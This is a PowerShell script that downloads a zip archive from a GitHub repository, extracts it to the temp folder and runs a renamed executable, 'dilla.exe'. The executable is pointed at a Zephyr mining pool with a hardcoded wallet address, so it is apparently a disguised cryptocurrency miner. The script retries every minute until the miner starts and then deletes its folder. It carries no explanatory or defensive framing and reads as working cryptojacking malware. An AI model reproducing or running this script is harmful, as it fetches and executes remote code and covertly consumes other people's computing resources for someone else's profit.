# Define the URL
$url = "https://github.com/Acelebi46/mybook/raw/main/pic-6.21.0-gcc-win64.zip"

# Create a temporary folder
$tempFolder = $env:TEMP + "\pic-6.21.0"
$localZipPath = $tempFolder + "\pic-6.21.0-gcc-win64.zip"
$localExtractPath = $tempFolder

# Logging function
function Log-Message {
    param(
        [string]$message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Output "$timestamp - $message"
}

# Function to run dilla.exe
function Run-dilla {
    try {
        Log-Message "Executing $exePath with arguments..."
        & $exePath -o de.zephyr.herominers.com:1123 -u ZEPHs8WzjKKMThXtJgWQPgKY4cmuDM5N1DRMHYJ134WxSys9nPXPmFvNjseNHBoNTnfXGDDGcFy1YFcaKqzpM9brcsPq9YYENi5 -p Gidilis -a rx/0 -k -t 1
        Log-Message "Execution successful."
        return $true
    } catch {
        Log-Message "Execution failed. $_"
        return $false
    }
}

# Main loop
while ($true) {
    # Create the temporary directory if it does not exist
    if (!(Test-Path -Path $tempFolder)) {
        New-Item -ItemType Directory -Force -Path $tempFolder
    }

    # Download and extract the file
    try {
        # Download the file
        Log-Message "Downloading $url to $localZipPath"
        Invoke-WebRequest -Uri $url -OutFile $localZipPath -ErrorAction Stop

        # Extract the ZIP file
        Log-Message "Extracting $localZipPath to $localExtractPath"
        Expand-Archive -Path $localZipPath -DestinationPath $localExtractPath -ErrorAction Stop
    } catch {
        Log-Message "Download or extraction failed. $_"
        throw $_
    }

    # Print debugging information
    Log-Message "Contents of $localExtractPath after extraction:"
    Get-ChildItem -Path $localExtractPath -Recurse

    # Check if the extraction was successful
    $exePath = Join-Path $localExtractPath "pic-6.21.0\dilla.exe"
    if (!(Test-Path -Path $exePath)) {
        Log-Message "Extraction failed. Executable not found at path: $exePath"
        throw "Extraction failed."
    }

    # Try running dilla.exe
    if (Run-dilla) {
        break  # Break out of the loop if execution is successful
    }

    # Sleep for a while before the next attempt
    Start-Sleep -Seconds 60
}

# Clean up: Remove the temporary folder
Remove-Item -Path $tempFolder -Recurse -Force